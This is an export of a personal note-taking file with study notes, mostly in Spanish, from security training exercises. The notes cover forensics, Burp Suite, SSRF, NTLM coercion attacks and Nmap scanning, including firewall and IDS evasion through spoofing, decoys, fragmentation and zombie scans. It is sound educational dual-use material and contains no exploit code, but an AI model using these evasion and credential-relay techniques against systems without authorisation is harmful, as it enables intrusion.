      ⇒ RGB: este se representa por 3 numeros del 0 al 255, describe la intensidad del Rojo, Azul y Verde
      ⇒ Greyscale: se representa por un numero del 0 al 255, donde 0 es completamente negro y 255 blanco
- Convolution
   → se reduce el tamaño de la entrada
   → se tienen miles de pixeles, por lo cual se necesita reducir haciendo sumarizacion de la imagen
   → para esto la matriz se mueve sobre toda la imagen, calculandolo
- Pooling
   → en este se puede aplicar un metodo estadistico
- Capas completamente conectadas
   → aqu trabaja como las demas redes neuronales, aqui todos los nodos son reconectados entre ellos
</rich_text>
      </node>
      <node name="day 17" unique_id="217" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702852543" ts_lastsave="1702870166">
        <rich_text>Traffic Analysis, I tawt I taw a c2 tat

Objetivos
- ganar conocimiento del formato del trafico de red
- entender las diferencias entre captura de full package y flujos de red
- aprender como procesar los flujos de datos de red
- conocer y usar la herramienta SiLK para el analisis de flujo de red

Network Traffic Data
- </rich_text>
        <rich_text style="italic">The network data is everywhere. It is all around us. Even now in this very task.</rich_text>
        <rich_text>
- esta ayuda a un manejo de red, resolucion de problemas, respuesta a incidentes y caceria de amenazas
- Network manager
   → monitoreo de performance
   → identificar cuellos de botella
   → asegurar la asignacion y calidad de servicios
- resolucion de problemas
   → identificar problemas de red
   → validar configuraciones, implementaciones y cambios
   → y configurar las lineas basicas de desempeño
- respuesta de incidentes
   → alcance del incidente
   → analisis de causa raiz
   → evaluacion de incidentes del dia dia
- caceria de amenzas
   → analisis proactivo para patrones maliciosos y sospechosos
- estos vienen en varios formatos, PCAP (Packet capture)
   → proveen un granular, crudo y comprensiva vista del trafico de red
   → provee todos los datos posibles representados por paquetes
- estos requieren guardarse, procesar y capacidades de analisis
- network flow data es una alternativa ligera a los PCAP's, uso de formato netflow

Mirada cerrada a PCAPs y flujos
- Comparacion:
   → Model
      ⇒ PCAP, captura de paquetes
      ⇒ Network Flow, Registros de flujos de protocolo
   → Profundidad de la informacion
      ⇒ PCAP, datos granulados detalladamente, contiene los datelles y payload
      ⇒ Network Flow, resumen de la data, no contiene detalles ni payload
   → Proposito general
      ⇒ PCAP, analisis profundo de paquetes
      ⇒ Network Flow, resumen del flujo de paquetes
   → Pros
      ⇒ PCAP, provee alta visibilidad de los paquetes
      ⇒ Network Flow, provee un resumen muy alto
   → Cons
      ⇒ PCAP, duro de procesar y requiere tiempo y recursos para ser analizado, la encriptacion es un obstaculo
      ⇒ Network Flow, resumen solamente, no payload
   → Campos disponibles
      ⇒ PCAP, capas de cabeceras y de payload
      ⇒ Network Flow, metadata de paquetes

Como colectar y procesar data de red
- se hace uso de monitoreo y analisis de la red (wireshark, tshark y tcpdump)

Recomendaciones y exploracion de herramientas
- hacer uso de SiLK, este contiene varias herramientas y binarios para coleccionar, parsear, filtrar y analizar el trafico de red
- este puede procesar directamente desde flujos, PCAPs y binary flow data

SiLK
- tiene dos partes
   → el sistema de paquetes, collecion de multiples flujos de red (IPFIX, NetfFow v9 y NetFlow v5)
   → la suite de analisis, contienen herramientas que pueden usarse para varias operaciones (list, sort, count y statistics)</rich_text>
      </node>
      <node name="day 18" unique_id="218" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702920046" ts_lastsave="1702921375">
        <rich_text>Eradication, A gift that keeps on giving

Objetivos
- identificar el uso de cpu y memoria en procesos de linux
- matar innecesarios procesos en linux
- buscar caminos que puedan persistir mas alla d ela terminacion
- remove procesos que son permanentemente procesando

Identificando los procesos
- manejo de procesos usando top

Chequeo de crons si kill mata el proceso y vuelve a parecer, crontab -l
Para revisar los servicios corriendo: systemctl list-unit-files</rich_text>
      </node>
      <node name="day 19" unique_id="219" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703024981" ts_lastsave="1703028384">
        <rich_text>Memory forensic, CrypTOYminers Sing volala-lala-lality

Memory dumps

Objectivos:
- entender que es memory forensics y como usarlo para investigaciones forenses digitales
- entender que es la data volatil y como volcarla
- aprender sobre volatibilidady como se puede hacer un analisis de volvado de memoria
- aprender sobre perfiles volatiles

Forensic Memory
- tambien conocida como memoria volatil o RAM
- rama del forense digital
- este involucra la examinacion y analisis de la RAM
- este difiere del analisis forense de disco, donde todos los archivos pueden ser recuperados y estudiados
- este se enfoca en los programas que estan corriendo cuando el dump fue creado
- este es volatil por que una vez apagada la compu esta memoria se borra

Data volatil
- informacion que esta temporalmente guardada en la RAM
- puede ser facilmente perdida o alterada
- ejemplos: procesos corriendo, coneccion de red y contenido de RAM

Memory dump
- snapshot de la memoria que ha sido capturado para hacer un analisis

Beneficios
- se encuentra la data en tiempo real
- es rapido ver actividades, detecta amenas cautelosas, datos volatiles como contraseñás y permite a los investigadores para entender actividades de los usuarios y estado de los sistemas durante memoria volatil
- en el disco duro se consume mas tiempo, ya que estos pueden tener miles de Gigabytes en tamaño

Que son los procesos
- independiente y autocontenida unidad de ejecucion dentro de un sistema operativo
- consiste de su propio codigo de programa, data, espacio en memoria y recursos del sistema
- existen dos tipos:
   → Procesos de usuario, estos son los que el usuario empezo, interactuan con el usuario
   → Procesos de fondo, estos operan sin interaccion con el usuario

Volatibility
- es un CLI que permite a analizar un dump en orden de analisis de performance
- esta escrito en python, se puede usar para:
   → listar y cerrar conecciones de red
   → listar un dispositivo corriendo procesos al mismo tiempo de la captura
   → listar posibles comandos en linea 
   → extraer posibles procesos malicioso

Profiles
- en este se define la arquitectura del SO, version y varias especificaciones de la memoria
- es crucial usar el profile apropiado, ya que cada uno tiene diferentes capas de memoria y estructuras de datos
- los profiles para linux deben crearse manualmente:
   → no es uno solo, sistema operativo monolitico, tiene diferentes distribuciones y configuraciones
   → depende de la version del kernel, configuraciones y capas de memoria
   → win tiene una estructura de memoria mas estandarizada y API del sistema
   → tambien tiene que ver que es un sistema de codigo abierto lo que hace que pueda tener variaciones

Plugins
- history file: vol.py -f {file} --profile={profile} linux_bash
- running process: vol.py -f {file} --profile={profile} linux_pslist
- process extraction: vol.py -f {file} --profile={profile} linux_procdump -D extracted
- file extraction: vol.py -f {file} --profile={profile} linux_enumerate_files</rich_text>
      </node>
      <node name="day 20" unique_id="220" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703092856" ts_lastsave="1703097089">
        <rich_text>DevSecOps, advent of frostlings

Objetivos
- aprender sobre ejecuciones de pipelines envenenadas
- entender como tener CI/CD seguros
- una introduccion a secure software development lifecycle y DevSecOps
- aprender sobre mejores practicas de CI/CD

Gitlab y SDLC cocepts
- plataforma que permite la colaboracion y automatizacion a travez del desarrollo de vida del software
- conceptos de GitLab:
   → Version control system: aqui se puede encontrar los cambio que se van haciendo al codigo
   → CI/CD pipelines: automatizacion de la creacion, testeo y despliegue del sistema
   → Escaneo de seguridad: tiene incorporacion de SAST, DAST y escaneo de contenedores

CI/CD
- Continuous integration: creacion y testeo del codigo que se va subiendo, tambien se hacen las validaciones y escaneos de seguridad
- Continuous deployment: aqui se envia el sistema a los diferentes entornos ya sea staging, sandbox o produccion

DevSecOps
- se hace el uso de seguridad en los pipelines de CI/CD

CI/CD Attacks: PPE
- poisoned pipeline execution
- este ataque compromete componentes o el entorno en el SDLC
- aqui el atacante tiene acceso al sistema de control (Git)</rich_text>
      </node>
      <node name="day 21" unique_id="222" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703187442" ts_lastsave="1703187454">
        <rich_text>DevSecOps, Yule be poisoned: A pipeline of insecure code

Objetivos:
- entender cuan grandes operan los entornos de CI/CD
- Explorar indirectamente ejecuciones de pipilenes envenados y como pyeden ser explotados con git
- aplicar explotacion de CI/CD a entornos grandes de CI/CD 

CI/CD environment
- pasos generales: desarrollo, crecion, testeo y despliegue
- estos pueden ser separados en diferentes sistemas

Plataformas de automatizacion
- se pueden tener dos tipos locales y remotas, travis CI es remota, mientras que jenkins es local
- estas corren sobre agentes para crear el proyecto
- estas plataformas pueden crear y configurar los entornos

envenamiento indirect en ejecucion de pipelines
- si el atacante no tiene acceso de escritura, es posible violar esta seguridad de forma indirecta modificando el alcance de la ejecucion del pipeline
- puede aprvecharse que en un repo se tenga la proteccion que dependa de otro que probablemente no tenga esa proteccion y haciendo uso de esto pueda modificar cosas del primero</rich_text>
      </node>
      <node name="day 22" unique_id="223" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703289733" ts_lastsave="1703290686">
        <rich_text>SSRF, Jingle your SSFR bels: A merry command and control hackventure

Objetivos:
- entender server-side request forgery (SSRF)
- qeu tipos de SSRF son usados para explotar vulnerabilidades
- prerequisitos pra explotar vulnerabilidades
- como trabaja el ataque
- como explotar la vulnerabilidad
- mitigar medidas para proteccion

Que es SSRF
- es una vulnerabilidad de seguridad que ocurre cuando el atacante tiene acceso desde una aplicacion web, ya sea interno o externo
- tipos:
   → Basic, se envia una peticion elaborada al servidor vulnerable ya sea a recursos internos o externos, accesos publicos
   → Blind SSRD, no se ve directamente la respuesta desde la peticion, se infiere la informacion usando las respuestas u observando los errores de mensaje
   → Semi-Blind SSRD, no se recive directamente la respuestaen su explorador o aplicacion

Prerequisitos para exploracion
- vulnerable input points, se tiene campos suceptibles a manipulacion como URLs o archivos que se pueden subir
- Lack of input validation, no se tiene validacion ni sanitizacion efectiva, se permite enviar peticiones maliciosas

Como trabaja
- Identificando las entradas vulnerables, se encuentra un input field que puede ser manipulado, este puede ser un parametro en la url, un endpoint o un parametro en la peticion
- manipulando la entrada, se da una URL maliciosa u otro payload, este puede ser una url al servidor internos, bucle hacia la direccion o un servidor externo que puede controlar al objketivo
- peticion a recursos no autorizados, se busca por medio de la peticion obtener acceso a recursos internos, servicios sensitivos o sistemas externos
- explotar la respuesta, este puede proveer informacion importante, como datos internos del servidor, credenciales o alguna otra cosa para poder explotar</rich_text>
      </node>
      <node name="day 23" unique_id="224" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703380325" ts_lastsave="1703817530">
        <rich_text>Coerced Authentication, relay all the way

Objetivos:
- lo basico de red para compartir archivos
- entender autenticacion NTLM
- como el ataque de coercion trabaja para autenticacion NTLM 
- como las respuestas trabajan para el ataque de coercion de autenticacion
- forzando la coercion de autenticacion usando archivos lnk

Introduccion
- conocer la autenticacion NTLM y como las amenzas pueden crear ataques de autenticacion de coercion

Compartir es demostrar interes (sharing is caring)
- se tiende a pensar que las computadoras son dispositivos aislados, pero el verdadero poder de una computadora viene cuando se conectan por red
- esto viene mucho cuando se qieren compartir recursos
- muchos de esto ayuda  poder tener lugares centralizados donde se puede acceder a documentos y estos estar protegidos por autenticacion
- a pesar de todo no siempre se tiene el control de compartir archivos de forma segura, esto puede causar dos errores:
   → si un atacante gana acceso puede obtener informacion sensitiva
   → si tiene acceso de escritura puede modificar archivos que sean importantes o mantenerse sobre ataque

NTLM autenticacion
- SMB permite conectarse cliente-servidor, sin embargo a este se le han encontrado multiples vulnerabilidades
- NetNTLM, referido a windows authentication, permite a la aplicacion hacer un middleman entre el cliente y el AD.
- este se usa en varios servicios incluidos SMB y RDP
- el usuario manda peticion al server, este responde con un ?challenge?, el usuario cifra su password con este challenge, para crear una respuesta y es enviada de nuevo al servidor, el servido pasa ambos al controlador de dominio, este se verifica para dar el acceso
- para ganar acceso no autorizado se deberia interceptar esta autenticacion y los challenges

</rich_text>
      </node>
      <node name="day 24" unique_id="225" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703454446" ts_lastsave="1703457827">
        <rich_text>Mobile analysis, You are on the naughty list, Mc Greedy

Objetivos
- Procedimientos para collecionar evidencia digital
- los retos con smartphones modernos
- usar Autopsy Digital Forensics con una imagen actual de andriod

Digital Forensic
- metodo usado por la ciencia resolver crimenes
- coleccionar evidencia desde las escenas del crimen
- se debe analizar e interpretar la evidencia para determinar que paso en la escena del crimen
- para la adquirir esta analisis se necesita una imagen cruda
- una raw image se una copia bit a bit
- es una parte escencial
- uso de una cadena de custodia, concepto legal usado para seguir la pocesion y manejo de evidencia, colecionada en una escena de crimen que es presentada en la corte

Adquiriendo una imagen digital forense
- esto puede representar un reto, dependiendo del dispostivo
- 4 tipos de adquisicion de imagenes forenses
   → Static acquisition: imagen bit a bit del dispositivo apagado
   → Live acquisition: image bit a bit del dispositivo prendido
   → Logical acquisition: una lista selecta de archivos copiados del archivo
   → Sparse acquisition: fragmentos seleccionados de datos sin asignar, esto contiene datos borrados
- considera los sigueintes escenarios
   → el tamaño de la computadora apagada
   → como parte de una escena del crimen, el investigador del crimen debe trabajar con la compu prendida

Una computadora que esta apagada
- se sabe que por default el disco no esta encriptado
- no se debe prender la compu para no tener cambios en el disco
- se clona el HDD o SDD removiendolo de la laptop y clonandolo
- pasos:
   → se usa un write blocker, clona sin ningun riesgo de modificar la data original
   → se obtiene una una imagen raw o equivalente
   → finalmente, necesitamos un dispositivo donde guardar la imagen

Una computadora que esta prendida
- en este caso se debe de apagar
- si esta cifrada la data se debe de tener el password

Obteniendo la imgen de un smartphone
- los smartphones modernos ahora estan cifrados por defecto

Cifrado en smart phones
- desde android 4.4 introduce cifrado de disco completados
- el telefono no puede entrar sin antes proveer el password
- android 7 infroduce direct boot, un modo de archivo basado en cifrado
- en android 9 y mayores se puede cifrar una SD
- desde andoid 6 el cifrado es forsozo
- iOS viene por default, usando filed'based encryption</rich_text>
      </node>
    </node>
    <node name="burpsuit" unique_id="226" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703562346" ts_lastsave="1704218809">
      <node name="the basics" unique_id="227" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703627307" ts_lastsave="1703817992">
        <rich_text>is a web application security testing framework

introduction a burpsuite
comprender el uso de varias herramientas disponibles del framework
una guia detallada del proceso de instalacion de burp suite
navigar y configurar burp suite

el core de burp suite es burp proxy

es un framework basado en java, diseñado para servir como como una solucion comprensiva para conduir penetraciones de aplicacion web
simplemente captura y activa la manipulacion de todo el trafico HTTP/HTTPS entre el explorador web y el servidor web
para entender como trabajar con esto es necesario entender como funcionan las secciones del framework
la habilidad de interceptar, ver y modificar las peticiones web

existen diferentes versiones, community edition, professional y empresarial

Features:
- Proxy, es la parte mas renombrada, permite interceptar y modificar las peticiones y respuestas
- Repeater, otra parte bien conocida, permite capturar, modificar y reenviar la misma peticion multples veces, se hace cuando se tiene prueba-error, por ejemplo SQLi o probar la funcionalidad de un endpoint para vulnerabilidades
- Intruder, comunmente para ataques de fuerza bruta o endpoints desconocidos
- Decoder, servicio para transformacion de datos, este puede decodificar la informacion capturada o codificar las cargas antes de enviarlas
- Comparer, permite comparar dos piezas de datos por cada palabra o byte
- Sequencer, se usa cuando se estan evualuando valores aleatorios, como valores de cookies u otro valor generado

Introduccion
- burp proxy es una herramienta fundamental y crucial que se tiene en burp suite
- permite capturar peticiones y respuestas entre el usuario y el web server
- este puede ser manipulado
- puntos clave:
   → interceptar peticiones, este debe nacer desde burp proxy, permite acciones como reenvio, eliminado, editado o enviarlo dentro de otros modulos
   → tomar control, permite tomar control sobre el trafico web, para testear web apps
   → capturar y logging, este puede ayudar para el analisis y revision de los requests
   → soporte para websocket, ahora se permite la comunicacion por websocket
   → logs and history, las peticiones pueden ser vistas en HTTP/WebSocket history
- notables faetures en proxy settings
   → intercepcion de repuestas, por default no viene activada se deben de activar con el checkbox en las reglas
   → match and replace, este permite hacer uso de regex para modificar la entrada y salida de las peticiones, hace cambios dinamicos como modificar el user agent o manipular cookies

el Target tab provee mas control sobre nuestro testeo:
- site map, permite usar el mapa de la aplicacion web en forma de arbol, sirve para mejorar el crawling del objeto, explorando links entre paginas y mappeando los sitios externos posibles, esto ayuda a acumular data 
- definicion de Issues, esta es una lista de vulnerabilidades web completa con descripciones y referencias
- configuraciones de alcance, esto permite incluir o excluir especificos domios y/o IP

Respondiendo a la carrera
- una herramienta que se puede usar es Responder, hace uso de man-in-the-middle
- en una LAN se puede envenenar cualquier Link-Local Multicast Name Resolution, NetBIOS Name Service y Web Proxy Auto-Discovery
- En VPN, no es considerada como red local, por lo cual es imposible detectar la intercepcion y envenamiento

Coercion no convencional
- si no se puede escuchar y envenenar el request, debemos de crear uno propio, este es un nuevo tipo de ataque de vector: coercion
- se pueden permitor dos tipos de ataques:
   → si el password de la cuenta coercionada es debil se puede crackear el challenge de NetNTLM fuera de linea usando herramientas como hastcat o john the ripper
   → si la configuracion es insuficiente se puede intentar mandar el challenge 
- dos increibles y populares versiones de coercion son PrintSpooler y PetitPotam

Alcance y objetivo
- aspecto de burp proxy
- captura y logging de de todo el trafico
- este sirve para poder interceptar todo o prevenir algoq ue no se requiera

Proxy HTTPs
- probelmas con el TLS enabled
- se debe bajar el certificado de </rich_text>
        <rich_text link="webs http://burt/cert">http://burt/cert</rich_text>
        <rich_text> y agregar al explorador</rich_text>
      </node>
      <node name="repeater" unique_id="228" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703818353" ts_lastsave="1703904881">
        <rich_text>Introduction
- advanced capabilities
- learn how to manipulate and resend captured requests
- explore the various options and functionalities available

What is?
- enables modify and resend intercepted requests
- manipulate captured requests with burp proxy
- is possible create manually requests
- sections:
   → Request list, is possible manage multiple requests
   → Request control, this allos send request, cancel and navigate on request history
   → Request and response view, this display request and response, in this is possible the edition
   → Layout option, enable customize the layout of requests and responses
   → Inspector, analyze and modify requests using raw editor
   → Target, specied the IP or domain to which the requests are sent

Basic Usage
- use with proxy module and trnasmit to repeater for editing and resuming
- send with right click and select send to repeater or using Ctrl + R

Inspector
- supplementary feature
- use to obtain a visually organized breakdown of request and response
- is possible use with proxy and repeater
- is possible change values for example change HTTP/1 to HTTP/2
- </rich_text>
      </node>
      <node name="intruder" unique_id="229" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703926025" ts_lastsave="1703999225">
        <rich_text>Introduction
- automated request manipulation and enables task such as fuzzing and brute-force
- automated and customisable attacks
- allow modify specific parts of a request and perform repetitive test with variations of input data
- used with fuzzing and brute-force

What is?
- automated testint requests with variation of input values
- this is captured from proxy modeule
- using for burting force login, similar to wfuzz or ffuf
- sub tabs:
   → Positions, select type of attack and configure payloads
   → Payloads, select values to insert into positions
   → Resouce pool, not particulary useful in CE, 
   → settings, configure attack behaviour
- Fuzzing is discover for example subpaths in URL

Positions
- first step is examine ositions within the request where we want to insert our payloads
- automatically attempts to identify the mos probable positions where payloads can be inserted

Payloads
- this create, assing and configure payloads
- payloads set:
   → select type of payload
   → with attack types only one option
- settings
   → specific options to current payload
- Processing
   → define rules to apply in each payload
   → is possible capitalize words, skip payloads that match with regex or apply transformation or filtering
- Encoding
   → cutomize the encoding options for our payloads

Sniper
- is the default and most commonly used attack type
- effective for single-position attacks, such as password brute-force or fuzzing for API endpoints
- provide set of payloads like wordlist or a range of numbers

Battering
- this only use the same word in position options

Pitchfork
- similar a multiple sniper attacks simultaneously
- use ibe payload set per position (max 20)
- both list needs the same size

Cluster bomb
- allows us choice multiple payloads sets, on per position (max 20)
- all payloadas are tested simultaneously</rich_text>
      </node>
      <node name="Other modules" unique_id="232" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704169288" ts_lastsave="1704175265">
        <rich_text>Decode, comparare, sequencer and organizer tools
operation with encoded text, enable comparison, allow the analysis of randomness

Decoder
- user manipulation capabilities
- not only decodes data intercepted during an attack but also provides the function to encode our on data
- create hashsums of data, providing a smart decode feature

Comparer
- used to compare data, in ASCII words or bytes

Sequencer
- evaluate the entropy, or randomness of tokens
- token as Cross-Site Request Forgery
- tow ways of capture:
   → live: common method and default, pass a request that will generate a token to sequencer for analysis, this can make the same request thousands of times
   → manual: load a list of preconfigured token samples

Organizer
- help to store and annotate copies of HTTP requests</rich_text>
      </node>
      <node name="extensions" unique_id="233" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704218809" ts_lastsave="1704219744">
        <rich_text>extension can be written in various languages, like python and java
python requires Jython</rich_text>
      </node>
    </node>
    <node name="NMAP" unique_id="234" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704239776" ts_lastsave="1704398126">
      <node name="Live Host Discovery" unique_id="235" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704239791" ts_lastsave="1704263847">
        <rich_text>Introduction
- efficent tool to help us handle repetitive tasks with
   → Which systems are up?
   → What services are running on these systems?
- cover:
   → ARP, discover live hosts
   → ICMP, identify hosts
   → TCP/UDP, send packages to TPC and UDP ports
- steps:
   → enumerate targets
   → discover live hosts
   → reverse-DNS lookup
   → scan ports
   → detect versions
   → detect OS
   → traceroute
   → Scripts
   → Write output

Subnetworks
- network segment is a group of computers connected using shared medium for example Ethernet switch or WiFi access point
- network segment refers ti a physical connection
- subnetwork refers to a logical connection
- like reconnaissance, we want to discover more information about a group of hosts or about subnet
- using ARP to discover live hosts, is a link layer protocol

Enumerate Targets
- list: MACHINE_IP URL1 URL2
- range: 10.11.12.15-20
- subnet: MACHINE_IP/30
- with file: nmap -iL list_hosts.txt
- check list of hosts: nmap -sL TARGETS

Discover live hosts
- use of TPC/IP layers
   → ARP from link Layer, send a frame to the broadcast address on the network segment and asking a computer with a specific ip to response MAC
   → ICMP frm network Layer, use ping type 8 (Echo) and Type 0 (Echo Reply)
   → TCP from transport Layer, network scanning purposes, used when ICMP is blocked
   → UDP from transport Layer

Using ARP with nmap
- use privileged user to use ARP requests
- outside the local network, nmap use ICMP echo requests, TCP ACK to port 80, TCP SYN to port 443, and ICMP timestamp request
- nmap by default use a ping scan to find lve hosts
- to discover without port-scanning use: nmap -sn TARGET
- ARP scan is possible only if you are on the same subnet
- to use: nmap -PR -sn TARGETS, -PR is ARP scan
- to check arp is possible use: arp-scan -l, to specify interface: arp-scan -I eth0 -l

Using ICMP with nmap
- send ping request TYPE8/echo to response ping reply TYPE0
- many firewalls block ICMP echo
- to use ICMP echo request: nmap -PE -sn TARGET, -sn to without port scan
- exists another ICMP petition using Timestamp request TYPE13 and reply TYPE14, adding -PP, ex: nmap -PP -sn TARGET
- another is using address mask queries, TYPE17 with repli TYPE18, using option -PM, ex: nmap -PM -sn TARGET

Using TCP and UDP with nmap
- TCP SYN Ping, send package with the SYN flag to TCP port 80, open port should reply with SYN/ACK, a closed port with RST, the specific state of the port is not significant here
   → way: SYN - SYN,ACK - ACK, this OK
   → way: SYN - SYN,ACK - RST, this closed
- to use with TCP SYN: use -PS followed by the port, nmap -PS -sn TARGET
- TCP ACK ping, sends a packet with ACK flag, by default use port 80
- use option -PA followed by ports
- example: nmap -PA -sn TARGET
   → way: ACK - RST, tcp port is open or closed
- UDP ping, this not expect to lead to any reply
   → way: UDP packet, this is open
   → way: UDP packet - ICMP Type3, Code 3, is closed
- TO use: nmap -PU -sn TARGET
- is possible use masscan
- options of ports is in -P{x}{port}

Using reverse-DNS lookup
- by default is used reverse-DNS online hosts
- because the hostnmaes can reveal a lot
- if does not send DNS queries use -n
- use -R to query the DNS server even for offline hosts, reverse-DNS lookup for all hosts
- is possible use a specific DNS using --dns-servers DNS_SERVER</rich_text>
      </node>
      <node name="Basic port scans" unique_id="236" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704265336" ts_lastsave="1704333665">
        <rich_text>TCP and UDP ports
- identify a network service running on host
- no more one services can listen on any TCP or UDP port
- two states:
   → open port, service is listening
   → close port, service is not listening
- states in nmap:
   → Open, services is listening
   → Closed, service is not listening, is accesible, is reachable and is not blocked by a firewall or other security appliance/programs
   → Filtered, cannot determine if the port is open or closed, port is not accessible, firewall preventing nmap from reaching that port
   → Unfiltered, cannot determine if the port is open or closed, the port is accessible, using an ACK scan -sA
   → Open|Filtered, cannot determine whether the port is open or filtered
   → Closed|Filtered, cannot determine whether the port is closed or filtered

TCP Flags
- different types of scans, depending of TCP header
- the first 24 bytes is a TCP header
- focus in TCP flags:
   → URG, urgent point is significant, data is urgent, process immediately
   → ACK, acknowledgement number is significant, , to acknowledge the receipt of a TCP segment
   → PSH, push asking TCP to pass the data to the application promptly
   → RST, used to reset connection, is possible send with firewall, when data is sent to a host and there is no service on the receiving end to answer
   → SYN, initiate a TCP 3-way handshake and synchronize sequence numbers with the other host
   → FIN, the sender has no more data to send

TCP connect scan
- works by completing the TCP 3-way handshake
- to send a RST/ACK use -sT, only check open ports and no establishing connection
- without root or sudoer only is possible discover open TCP ports
- port response RST/ACK to close port
- use of -F to fast mode, change from 1000 to 100 port scanner
- -r to scan ports in consecutive order instead of random order

TCP SYN scan
- the default scan is SYN scan, using privileged user
- required a privileged user to run
- does not complete the TCP 3-way handshake
- this does not establish a TCP connection
- select this scan using -sS
   → way: SYN - SYN/ACK - RST

UDP scan
- connection less potocol
- cannot guarantee that a service listening on a UDP port would respond to our packets
- an ICMP port unreachable error type3, code3 is returned
- usgin with -sU
   → way: UDP packet, no response open port
   → way: UDP packet - ICMP type3, code 3, port is closed
- ex: nmap -sU -F -v {ip}
- priviledge user is necesary

Fine-Tuning scope and performance
- specify ports with:
   → -p{list of ports using comma}
   → -p{port}-{to port}
   → -p-, to check all ports
   → -F to 100 most common
   → --top-ports {number to check}
- scan timing control with: -T&lt;0-5&gt;, when -T0 us the slowest (paranoid) and -T5(fastest):
   → paranoid (0)
   → sneaky (1)
   → polite (2)
   → normal (3)
   → Aggresive (4)
   → insane (5)
- to avoid alerts use 0 or 1
- default is 3
- 4 is used wirh CTFs and when learningto scan with practice
- control rate using --min-rate {number} and --max-rate {number}
- prallelization using --min-parallelism and --max-parallelism</rich_text>
      </node>
      <node name="Advanced port scans" unique_id="237" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704334161" ts_lastsave="1704396625">
        <rich_text>an ACK flag is set when you want to acknowledge received data, ACK scan is like trying acknowledge (reconociendo) data that was neither sent nor received in the first place
types of port scans:
- Null scan
- FIN scan
- Xmas scan
- Maimon scan
- ACK scan
- Window scan
- Custom scan

Cover soon:
- Spoofing IP
- Spoofing MAC
- Decoy scan
- Fragmented Packets
- Idle/Zombie scan

Evade Firewalls and IDS systems

Null Scan
- does not set any flag
- use -sN option
- this not trigger any response when irt reaches an open ports
- way
   → NULL - no response, open port
   → NULL - RST,ACK, port us closed

FIN Scan
- send TCP package with flag FIN
- using -sF to select this option
- similar to Null scan
- is not sure if the port is open or if a firewall is blocking
   → way: FIN - Null response, open port
   → way: FIN - RST,ACK, port is closed

Xmas Scan
- use name of Christmass tree lights
- sets the FIN, PSH and URG flag
- use -sX to select
   → way: FIN,PSH,URG - Null response, open port
   → way: FIN,PSH,URG - RST,ACK, port is closed
- efficient in scanning a target behind stateless firewall

Maimon Scan
- FIN and ACK are set
- send a RST packet as a response
- certain BSD systems drop tha packet if it is an open port
- to select: -sM
- response is an RST packet
   → way: FIN/ACK - RST, port open or closed, in some systems drop package if port is open

ACK Scan
- send packet with the ACK flag set
- use -sA option
- target response with RST
   → way: ACK - RST, port is open or closed
- used if there is a firewall in front of the target
- to discover firewall rule sets and configuration

Window Scan
- almost the same as the ACK scan
- this examines the TCP Windows field of the RST packet returned
- on specific systems, this can reveal that the port is open
- use -Sw to select this option
   → way: ACK - RST, port is open or closed
- against a linux system with no firewall will not provide much information
- with repeat petition we get more satisfying result

Custom Scan
- TCP flag combination, use --scanflags
- ex: --scanflag RSTSYNFIN to set RST,SYN,FIN

Spoofing and decoys
- target scan using spoofed IP address and even a spoofed MAC Address
- beneficial in a situation where you can guarantee to cature the response
- command: nmap -S SPOOFED_IP MACHINE_IP
- save packages in spoofed ip
- three steps:
   → attacker send a packet with a poofed source IP address to the target machine
   → Target machine replies to the spoofec IP address as the destination
   → Attacker catures the replies to figure out open ports
- expect the network interface using -e and explicity disbale ping with -Pn 
- using same subnet as the target machine, you would be able to spoof your MAC address as well, using --spoof-mac SPOOFED_MAC, this only works if attacker and target is in the same Ethernet network or same WiFi
- tha attacker might resort to using decoy to make it more challenging to be pinpointed, is simple coming from many IP address, this lost IP of attacker
- use to decoy: nmap -D DECOY1,ME,DECOY2 MACHINE_IP

Fragmented packets
- Firewall, is a piece of software or hardware that permits packets to pass or block
- IDS, intrusion detection system, use to select packets wit specific patterns or specific content signatures, this inspect data content, and check if is malicious pattern
- fragmented packets, use option -f, to fragment packets
   → divided into 8 bytes or less
   → using -f -f or -ff split in 16 byte-fragment
   → is possible change the value using --mtu
   → to increment size of packets use --data-length NUM

Idle/Zombie Scan
- spoofing to check scanning stealthily
- requieres an idle system connected to the network that you can cominicate with
- test is used like idle host
- running: nmap -sI ZOMBIE_IP MACHINE_IP
- this is required:
